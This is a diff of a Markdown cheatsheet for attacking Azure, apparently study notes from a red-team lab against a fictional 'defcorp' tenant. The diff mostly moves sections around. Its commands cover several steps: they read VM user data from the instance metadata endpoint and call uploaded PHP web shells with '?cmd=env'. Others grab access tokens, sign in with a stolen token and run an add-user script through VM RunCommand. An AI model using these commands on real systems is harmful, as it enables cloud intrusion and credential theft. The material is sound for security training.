@@ -92,8 +92,6 @@ Get-AzKeyVault
     - [subdomains](https://github.com/conma293/Azure/blob/main/cheatsheet.md#subdomains)
     - [storage blobs](https://github.com/conma293/Azure/blob/main/cheatsheet.md#storage-blobs)
     - [Application Proxy - Users who can access](https://github.com/conma293/Azure/blob/main/cheatsheet.md#users-able-to-access-appproxy)
-- IMDS
-  - [VM User Data](https://github.com/conma293/Azure/blob/main/cheatsheet.md#vm-userdata)
 - Playbooks
   - [Create Runbook](https://github.com/conma293/Azure/blob/main/cheatsheet.md#create-runbooks)
   - [RunCommand](https://github.com/conma293/Azure/blob/main/cheatsheet.md#runcommand)
@@ -105,6 +103,8 @@ Get-AzKeyVault
   - [Token Stealing]()
 - Web Application Exploitation
   - [Insecure WebApp FILE UPLOAD](https://github.com/conma293/Azure/blob/main/cheatsheet.md#web-application-file-upload)
+- IMDS
+  - [VM User Data](https://github.com/conma293/Azure/blob/main/cheatsheet.md#vm-userdata)    
 - Steal Primary Refresh Token (PRT)
    - [Get nonce](https://github.com/conma293/Azure/blob/main/cheatsheet.md#get-nonce)
    - [Get PRT]
@@ -439,16 +439,41 @@ Invoke-EnumerateAzureBlobs -Base defcorp
 . C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1 
 Get-ApplicationProxyAssignedUsersAndGroups -ObjectId ec350d24-e4e4-4033-ad3f-bf60395f0362
 ```
-* * * 
-
-## IMDS
-#### VM UserData:
-```
-$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
-[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
-```
 
 * * * 
+
+# Web Application File Upload
+
+Files:
+- studentxshell.phtml
+- studentxtoken.phtml
+- RevShell_phtml.phtml
+
+Example upload:
+```
+https://defcorphqcareer.azurewebsites.net/
+https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
+```
+
+append:
+```
+/uploads/studentxshell.phtml?cmd=env
+```
+
+For tokens browse to:
+```
+/uploads/studentxtoken.phtml
+```
+
+Now we can launch an session
+```"client_id":``` ==  ```-AccountId```
+
+```
+Connect-AzAccount -AccessToken $Token -AccountId <client_id>
+```
+
+* * * 
+
 # Playbooks
 
 ## Create Runbooks
@@ -486,6 +511,9 @@ Now we can run the script via VMRumCommand:
 Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
 ```
 
+* * *
+
+
 ## Connect to VM
 #### Get Public IP
 ```
@@ -519,36 +547,16 @@ cat C:\Users\studentuserx\.Azure\AzureRmContext.json
 ```
 
 
-# Web Application File Upload
 
-Files:
-- studentxshell.phtml
-- studentxtoken.phtml
-- RevShell_phtml.phtml
-
-Example upload:
+* * *
+## IMDS
+#### VM UserData:
 ```
-https://defcorphqcareer.azurewebsites.net/
-https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
+$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
 ```
 
-append:
-```
-/uploads/studentxshell.phtml?cmd=env
-```
-
-For tokens browse to:
-```
-/uploads/studentxtoken.phtml
-```
-
-Now we can launch an session
-```"client_id":``` ==  ```-AccountId```
-
-```
-Connect-AzAccount -AccessToken $Token -AccountId <client_id>
-```
-
+* * * 
 
 ## Steal Primary Refresh Token
 #### Get nonce
